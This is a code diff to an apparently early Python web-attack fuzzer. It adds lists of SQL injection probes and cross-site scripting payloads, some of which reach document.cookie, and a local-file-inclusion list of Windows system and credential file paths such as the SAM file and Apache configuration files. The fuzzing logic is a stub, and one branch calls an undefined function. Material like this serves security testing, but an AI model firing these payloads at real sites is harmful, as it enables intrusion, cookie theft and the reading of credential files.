@@ -1,13 +1,40 @@
 import argparse, urllib, os, sys
 
 sqli = ["'", "\"", "`", "and 1=0", "or 1=0", "' and 1=0", "' or 1=0", "\" and 1=0", "\" or 1=0", "`and 1=0", "` or 1=0"]
-xss = ["';alert(String.fromCharCode(88,83,83))//", "\";alert(String.fromCharCode(88,83,83))//",
-       "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "'';!--\"<XSS>=&{()}",
-       "<IMG SRC=\"javascript:alert('XSS');\">", "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=JaVaScRiPt:alert('XSS')>",
-       "<IMG SRC=`javascript:alert(\"Test, 'XSS'\")`>", "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
-       "<a onmouseover=alert(document.cookie)>xxs link</a>", "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
+xss = ["';alert(String.fromCharCode(88,83,83))//",
+       "\";alert(String.fromCharCode(88,83,83))//",
+       "--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+       "'';!--\"<XSS>=&{()}",
+       "<IMG SRC=\"javascript:alert('XSS');\">",
+       "<IMG SRC=javascript:alert('XSS')>",
+       "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+       "<IMG SRC=`javascript:alert(\"Test, 'XSS'\")`>",
+       "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
+       "<a onmouseover=alert(document.cookie)>xxs link</a>",
+       "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"]
-lfi = []
+lfi = ["C:\boot.ini",
+       "C:\WINDOWS\win.ini",
+       "C:\WINNT\win.ini",
+       "C:\WINDOWS\Repair\SAM",
+       "C:\WINDOWS\php.ini",
+       "C:\WINNT\php.ini",
+        "C:\Program Files\Apache Group\Apache\conf\httpd.conf",
+        "C:\Program Files\Apache Group\Apache2\conf\httpd.conf",
+        "C:\Program Files\\xampp\apache\conf\httpd.conf",
+        "C:\php\php.ini",
+        "C:\php5\php.ini",
+        "C:\php4\php.ini",
+        "C:\apache\php\php.ini",
+        "C:\\xampp\apache\bin\php.ini",
+        "C:\home2\bin\stable\apache\php.ini",
+        "C:\home\bin\stable\apache\php.ini",
+        "C:\Program Files\Apache Group\Apache\logs\access.log",
+        "C:\Program Files\Apache Group\Apache\logs\error.log",
+        "C\WINDOWS\TEMP\\",
+        "C\php\sessions\\",
+        "C:\php5\sessions\\",
+        "C:\php4\sessions\\"]
 rfi = []
 rce = []
 
@@ -29,6 +56,8 @@ def get():
     elif i=="3":atk = lfi
     elif i=="4":atk = rfi
     elif i=="5":atk = rce
+    for i in atk:
+        r = 1
     print(atk)
 
 def post():
@@ -48,5 +77,9 @@ args = parser.parse_args()
 
 clearScreen()
 
-if args.method.lower() == 'get':get()
-elif args.method.lower() == 'post':post()
+try:
+    if args.method.lower() == 'get':get()
+    elif args.method.lower() == 'post':post()
+    elif args.method.lower() == 'cookie':cookie()
+except:
+    parser.print_help()
